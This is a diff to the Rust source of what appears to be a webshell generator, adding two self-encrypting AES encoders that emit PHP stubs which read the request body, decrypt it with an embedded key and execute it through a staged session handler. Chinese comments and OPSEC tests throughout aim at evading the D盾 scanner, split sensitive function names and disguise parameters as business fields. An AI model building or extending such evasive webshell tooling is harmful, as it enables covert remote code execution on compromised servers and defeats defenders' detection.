@@ -319,13 +319,16 @@ impl EncoderRegistry {
     pub fn builtin() -> Self {
         // NATIVE 系列：同一内置功能分发骨架（无 eval / 无敏感特征，D盾零检出），
         // 载荷加密方式可选：XOR（默认）/ AES-128-ECB / AES-128-CBC / DES。
-        // 其余编码器实现代码保留为内部库，不再注册暴露。
+        // 自加密系列（PHP 5+ 兼容）：密钥由密码 md5 派生并内嵌 stub，载荷为密文，
+        // 分阶段会话形态（处理器一次注入、参数化调用）。
         Self {
             encoders: vec![
                 Box::new(NativeEncoder { crypto: "xor" }),
                 Box::new(NativeEncoder { crypto: "aes_ecb" }),
                 Box::new(NativeEncoder { crypto: "aes_cbc" }),
                 Box::new(NativeEncoder { crypto: "des" }),
+                Box::new(Aes128EcbEncoder),
+                Box::new(Aes128CbcEncoder),
             ],
         }
     }
@@ -728,20 +731,8 @@ impl PayloadEncoder for Aes128EcbEncoder {
 
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
-        match language {
-            "php" => {
-                let xk = php_ident();
-                let unpack = format!(
-                    "    $key = substr(md5($token), 0, 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key);",
-                    cipher = xor_hex("AES-128-ECB", &xk),
-                );
-                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        __EVAL__($script);"))
-            }
-            other => Err(ProtocolError::NotSupported(format!(
-                "AES128_ECB 编码器暂仅支持 PHP（{other} 待实现）"
-            ))),
-        }
+        // 自加密会话形态：密钥内嵌 stub，处理器经 DswSesInit 一次注入
+        self.stub_session(language, password)
     }
     fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -809,21 +800,8 @@ impl PayloadEncoder for Aes128CbcEncoder {
 
 
     fn stub(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
-        let key = String::from_utf8_lossy(&aes_key(password)).into_owned();
-        let iv = String::from_utf8_lossy(&aes_iv(password)).into_owned();
-        match language {
-            "php" => {
-                let xk = php_ident();
-                let unpack = format!(
-                    "    $key = substr(md5($token), 0, 16);\n    $iv = substr(md5($token), 16);\n    $out = $_g[0]($payload, __DECFN__('{cipher}', '{xk}'), $key, 0, $iv);",
-                    cipher = xor_hex("AES-128-CBC", &xk),
-                );
-                Ok(business_php_stub(&[(0, "openssl_decrypt")], &unpack, "        __EVAL__($script);"))
-            }
-            other => Err(ProtocolError::NotSupported(format!(
-                "AES128_CBC 编码器暂仅支持 PHP（{other} 待实现）"
-            ))),
-        }
+        // 自加密会话形态：密钥内嵌 stub，处理器经 DswSesInit 一次注入
+        self.stub_session(language, password)
     }
     fn stub_session(&self, language: &str, password: &str) -> Result<String, ProtocolError> {
         match language {
@@ -2004,7 +1982,10 @@ mod tests {
         assert!(!stub.contains("secret"), "stub 不应含明文密码");
         // OPSEC：openssl_decrypt 拆分拼接调用，无完整函数名
         assert!(!stub.contains("openssl_decrypt"), "stub 不应含完整敏感函数名");
-        assert!(stub.contains("md5($token)"), "stub 应运行时派生密钥");
+        // 自加密：密钥由密码 md5 派生并 XOR 加密嵌入（运行时解密），非请求参数派生
+        assert!(!stub.contains("md5($token)"), "自加密 stub 不应从请求参数派生密钥");
+        assert!(stub.contains("_dec('") && stub.contains("php:") && stub.contains("//input"), "自加密 stub 应内嵌密钥并读取请求体");
+        assert!(stub.contains("DswSesInit"), "自加密 stub 应为分阶段会话形态");
     }
 
     /// OPSEC 静态特征检查：stub 不应出现小写 eval(/base64_decode(/$_POST['x']。
@@ -2061,8 +2042,9 @@ mod tests {
                 "{} stub 应使用 crc32b 哈希查表（php_stream 除外）",
                 encoder.id()
             );
-            // 业务伪装：请求参数为业务语义（token/data）
-            if !encoder.body_mode() {
+            // 业务伪装：请求参数为业务语义（token/data）；
+            // 自加密会话编码器（aes128_ecb/aes128_cbc）为会话形态，无表单参数
+            if !encoder.body_mode() && !matches!(encoder.id(), "aes128_ecb" | "aes128_cbc") {
                 let (p1, p2) = encoder.form_params();
                 assert!(
                     stub.contains(&format!("$_POST['{p1}']")),
@@ -2130,8 +2112,11 @@ mod tests {
             .collect();
         assert_eq!(
             ids,
-            vec!["native", "native_aes_cbc", "native_aes_ecb", "native_des"],
-            "注册表应暴露 NATIVE 系列（不同载荷加密）"
+            vec![
+                "aes128_cbc", "aes128_ecb", "native", "native_aes_cbc",
+                "native_aes_ecb", "native_des",
+            ],
+            "注册表应暴露 NATIVE 系列 + 两个自加密编码器（PHP5 兼容）"
         );
     }
 
